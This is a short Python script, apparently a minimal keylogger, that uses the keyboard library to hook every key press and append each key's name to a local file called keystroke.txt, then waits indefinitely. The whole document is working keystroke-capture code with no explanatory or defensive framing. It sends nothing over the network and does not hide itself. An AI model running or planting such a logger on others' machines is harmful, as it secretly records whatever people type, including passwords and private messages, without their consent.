import keyboard

def pressKey(key):
    with open("keystroke.txt", "a") as f:
        f.write("{}\n".format(key.name))

keyboard.on_press(pressKey)

keyboard.wait()